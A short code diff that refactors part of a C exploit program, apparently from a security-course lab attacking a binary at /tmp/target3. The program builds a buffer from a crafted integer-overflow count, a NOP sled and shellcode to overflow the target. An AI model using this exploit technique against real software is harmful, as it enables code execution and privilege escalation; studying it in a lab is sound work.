@@ -6,14 +6,13 @@
 
 #define TARGET "/tmp/target3"
 #define NOP 0x90
-#define TARGET_SIZE 160 * 16
 
 int main(void) {
   char *args[3];
   char *env[1];
 
-  char buf[12 + TARGET_SIZE + 8 + 1] = "-2147483487,"; // (1 << 31) + 161
-  memset(buf + strlen(buf), NOP, TARGET_SIZE);
+  char buf[12 + 160 * 16 + 8 + 1] = "-2147483487,"; // (1 << 31) + 161
+  memset(buf + strlen(buf), NOP, 160 * 16);
 
   char* end = buf + sizeof(buf) - 8 - 1;
   strcpy(end - strlen(shellcode), shellcode);
